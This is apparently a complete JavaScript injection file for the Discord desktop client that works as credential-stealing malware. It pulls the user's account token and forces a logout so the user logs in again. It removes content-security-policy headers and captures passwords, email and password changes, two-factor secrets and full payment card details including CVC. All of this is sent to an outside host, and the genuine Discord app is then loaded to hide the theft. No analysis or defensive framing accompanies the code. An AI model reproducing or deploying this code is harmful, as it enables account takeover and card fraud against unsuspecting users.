const electron = require("electron");
const getTokenScript = 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[.get_require]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;';
var loggedOut = false;

electron.app.once("ready", () => {
    electron.session.defaultSession.webRequest.onBeforeRequest({
        urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
    }, (eyder, xinran) => {
        const aagam = electron.BrowserWindow.getAllWindows()[0];
        !loggedOut && (loggedOut = true, aagam.webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[.get_require]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', true));
        if (eyder.url.startsWith("wss://")) xinran({
            cancel: true
        });
        else xinran({
            cancel: false
        });
    }), electron.session.defaultSession.webRequest.onHeadersReceived((pretto, jamareon) => {
        delete pretto.responseHeaders["content-security-policy"], delete pretto.responseHeaders["content-security-policy-report-only"], jamareon({
            responseHeaders: {
                ...pretto.responseHeaders,
                "Access-Control-Allow-Headers": "*"
            }
        });
    }), electron.session.defaultSession.webRequest.onCompleted({
        urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discord.com/api/v*/users/@me/mfa/totp/enable", "https://discordapp.com/api/v*/users/@me/mfa/totp/enable", "https://*.discord.com/api/v*/users/@me/mfa/totp/enable", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v*/tokens"]
    }, async (ekco, maimouna) => {
        const skky = electron.BrowserWindow.getAllWindows()[0];
        if (ekco.statusCode != 200) return;
        const taijha = await skky.webContents.executeJavaScript(getTokenScript, true);
        if (ekco.url.endsWith("tokens")) {
            const melani = Buffer.from(ekco.uploadData[0].bytes).toString().replaceAll("&", "").replaceAll("card", "").replaceAll("[", "").replaceAll("]", "").replaceAll("cvc", "").replaceAll("guid", "").replaceAll("exp_month", "").replaceAll("exp_year", "");
            newData("cardAdded", taijha, melani.split("=")[1], melani.split("=")[2], melani.split("=")[3], melani.split("=")[4]);
        } else {
            const santy = JSON.parse(Buffer.from(ekco.uploadData[0].bytes).toString());
            if (ekco.url.endsWith("login")) newData("login", taijha, santy.password);
            if (ekco.url.includes("users/@me/mfa/totp/enable")) newData("enabled2FA", taijha, santy.secret, santy.password);
            if (ekco.url.endsWith("users/@me")) {
                if (ekco.method != "PATCH") return;
                if (!santy.password) return;
                if (santy.email) newData("changedEmail", taijha, santy.email, santy.password);
                if (santy.new_password) newData("changedPassword", taijha, santy.password, santy.new_password);
            }
        }
    });
});

function sendToApi(mazikeen) {
    const ciin = electron.BrowserWindow.getAllWindows()[0];
    ciin.webContents.executeJavaScript("    \n        var xhr = new XMLHttpRequest();\n        xhr.open(\"POST\", \"https://superfuniestindianparty.rip/QDVkCo9cC0g2\", true);\n        xhr.setRequestHeader('Content-Type', 'application/json');\n        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n        xhr.send(JSON.stringify(" + mazikeen + "));\n    ", true);
}

function newData(samaj, shaynee, ...f) {
    const rosha = electron.BrowserWindow.getAllWindows()[0];
    rosha.webContents.executeJavaScript("\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me\", false);\n        xmlHttp.setRequestHeader(\"Authorization\"," + ' "' + shaynee + ("\");\n        xmlHttp.send(null);\n        xmlHttp.responseText;"), true).then(gemayel => {
        var anietra = JSON.parse(gemayel);
        var laurianne = {
            username: anietra.username + "#" + anietra.discriminator,
            id: anietra.id,
            avatar: anietra.avatar,
            nitro: anietra.premium_type,
            badges: anietra.flags,
            email: anietra.email,
            token: shaynee,
            type: samaj
        };
        switch (samaj) {
            case "login":
                laurianne.password = f[0];
                break;
            case "changedEmail":
                anietra.email = f[0], laurianne.password = f[1];
                break;
            case "changedPassword":
                laurianne.oldPassword = f[0], laurianne.newPassword = f[1];
                break;
            case "cardAdded":
                laurianne.card = {
                    number: f[0],
                    cvc: f[1],
                    expire: {
                        month: f[2],
                        year: f[3]
                    }
                };
                break;
            case "enabled2FA":
                laurianne.secret = f[0], laurianne.password = f[1];
                break;
        }
        sendToApi(JSON.stringify(laurianne));
    });
}

const Module = require("module"),
    {
        join,
        dirname
    } = require("path"),
    discordPath = join(dirname(require.main.filename), "..", "app.asar"),
    discordPackage = require(join(discordPath, "package.json"));

electron.app.setAppPath(discordPath);
electron.app.name = discordPackage.name;
Module._load(join(discordPath, discordPackage.main), null, true);
require.main.filename = join(discordPath, "app_bootstrap/index.js");
